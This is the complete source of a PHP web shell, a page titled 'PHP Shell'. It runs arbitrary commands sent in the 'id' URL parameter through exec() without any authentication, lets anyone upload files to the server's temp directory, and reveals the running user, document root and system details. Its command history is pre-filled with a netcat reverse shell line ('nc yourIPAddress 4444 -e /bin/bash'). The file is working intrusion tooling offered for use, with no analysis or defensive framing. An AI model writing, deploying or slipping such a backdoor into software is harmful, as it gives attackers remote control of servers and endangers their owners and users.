<?php
	if(isset($_GET['id']))
	{
		$command = stripslashes($_GET['id']);
		exec($command . " 2>&1",$out);
		foreach($out as $o)
       		echo $o . "\n";
	}
        else if(isset($_FILES['file']['tmp_name']))
        {
            $name = basename($_FILES['file']['name']);
            if(move_uploaded_file($_FILES['file']['tmp_name'], $_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp" . "/" . basename($_FILES['file']['name']))) 
            {
                echo "<textarea style='color:white;'>$name: Success!</textarea>";
            }
            else
            {
                echo "<textarea style='color:white;'>$name: Failure!</textarea>";
            }
            exit();
            
        }
	else
	{
?>
<html>
<head>
<title>PHP Shell</title>
<style>

* {
  margin: 0;
  padding: 0;
  border: 0;
  overflow-y: hidden;
  background-color:black;
  color: white;
}
html,body{
height: 100%;
}
.wrapper{
   min-height:100%;
   margin 0 auto -2em;
}
.output{
  color: white;
  font-family:"Courier New",monospace;
  font-size:12px;
  width: 100%;
  height: 90%;
}
.input{
  float: left;
  border-bottom:2px inset white;
  border-top:2px inset white;
  color: white;
  background-color: black;
  font-family:"Courier New",monospace;
  font-size:12px;
  width: 80%;
  height: 4%;
}
.info{
  clear: both;
  display: block;
  color:white;
  font-family:"Courier New",monospace;
  font-size:12px;
  width: 100%;
  height: 2em;
  margin-top: -2em;
}
.popup{
  position:absolute;
  left: 0px;
  top: 0px;
  z-index:10;
  border:5px;
  border-style:double;
  border-color:white;
  height:100px;
  width:400px;
  font-family:"Courier New",monospace;
  font-size:12px;
 
}
.push{
    height: 2em;
}
.form1{
  height:100%;
}
.button{
  border:0px;
  border-left:1px outset white;
  border-top:1px outset white;
  border-bottom:1px outset white;
  color:white;
  background-color: black;
  font-family:"Courier New",monospace;
  font-size:12px;
  text-align: center;
  height: 4%;
  width:10%;
  float:right;
}
p{ color:white; }
</style>

<script type="text/javascript">

http = new XMLHttpRequest();
var bash_history = new Array(10);
bash_history[0] = "nc yourIPAddress 4444 -e /bin/bash"
var history_newest = 0;
var history_oldest = 0;
var history_place = -1;
function submitform(myfield, e)
{
  var key;
  if(window.event)
    {
      key = window.event.keyCode;
    }
  else if(e) key = e.which;
  else return true;

  	if(key == 13)
  	{
		updateData(document.form1.input.value);
		document.form1.input.value="";
    	return false;
	}
	else if(key == 38) // Up Arrow
	{
		if(history_place != history_oldest)
		{
			//go up in history
			if(history_place == -1)
			{
				history_place = history_newest;
			}			
			else
			{
				history_place--;
				if(history_place == -1)
				{
					history_place += 10;
				}
			}
			document.form1.input.value = bash_history[history_place];
		}
		else
		{
			document.form1.input.value = bash_history[history_oldest];
		}
	
		return false;
	}
	else if(key == 40) // Down Arrow
	{
		if(history_place == -1 || history_newest == history_oldest || history_place == history_newest)
		{
			history_place = -1;
			document.form1.input.value = "";
		}
		else
		{
			history_place = (history_place + 1)%10;
			document.form1.input.value = bash_history[history_place];
		}
		return false;
	}
	else
	{
		return true;
	}
}

function updateData(param) 
{
	if(param == "")
	{
		return;
	}
	//manage bash_history
	
	history_newest = history_newest + 1;
	if(history_newest == 10)
	{
		history_newest = 0;
	}
	if(history_newest == history_oldest)
	{
		history_oldest = history_oldest + 1;
		if(history_oldest == 10)
		{
			history_oldest = 0;
		}
	}
	bash_history[history_newest] = param;
	history_place = -1;

	if(param == "clear")
	{
		document.form1.output.value = "";
		return;
  	}
  	
	document.form1.output.value+= "$: " + param + "\n";
	document.form1.output.scrollTop = document.form1.output.scrollHeight;
  	var myurl = <?php echo "\"" . $_SERVER['REQUEST_URI']. "\""; ?>

	http.open("GET", myurl + "?id=" + escape(param), true);
	http.onreadystatechange = useHttpResponse;
	http.send(null);
  
}

function useHttpResponse() {
  if (http.readyState == 4) {
    var textout = http.responseText;
    document.form1.output.value+=textout;
    document.form1.output.scrollTop = document.form1.output.scrollHeight;
  }
}

function fileUploadBox() {
  var uploadDiv = document.createElement("div");
  uploadDiv.setAttribute("align","center");
  uploadDiv.id="upload_box";
  uploadDiv.className = "popup"; 
  uploadDiv.innerHTML="<form id='file_upload' method='post' enctype='multipart/form-data' target='uploader'><input name='file' id='file' type='file' /><br /><input type='submit' name='action' value='Upload to <?php echo htmlentities($_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp"); ?>' style='border:1px solid white;'/><br /><iframe name='uploader' id='uploader' src='<?php echo "./" . $_SERVER['REQUEST_URI'];?>' width='0' height='0' style='display:none;'></iframe></form><button name='close_button' class='button' type='button' style='height:3em;width:30%;' onclick='var element = document.getElementById(\"upload_box\"); element.parentNode.removeChild(element);' readonly=true>Close!</button>";
  document.body.appendChild(uploadDiv);
   
}
</script>

</head>
<body onLoad="document.form1.input.focus(); document.form1.output.scrollTop = document.form1.output.scrollHeight" onKeyDown="return submitform(this, event)">
<div class="wrapper">
<form name="form1">
<textarea name="output" class="output" readonly=true></textarea>
<script>document.form1.output.value="";document.title="PHP Shell: " + window.location.hostname;</script>
<textarea name="input" class="input"></textarea>
<button name="upload_button" class="button" type="button" readonly=true onclick="fileUploadBox();">Upload!</button>
<button name="submit_button" class="button" type="button" readonly=true onclick="updateData(document.form1.input.value); document.form1.input.value=''">Execute!</button>
</form>
<div class="push"></div>
</div>
<textarea name="info" class="info" readonly=true>
<?php 
exec("whoami",$who);
$pwd=$_SERVER["DOCUMENT_ROOT"];
$sys=PHP_OS . ", " .$_SERVER['SERVER_SOFTWARE']. ", " . phpversion();
echo "user: $who[0]\tlocation: $pwd\tsystem: $sys"; 
?>
</textarea>
</body>
</html>
<?php
	}
?>
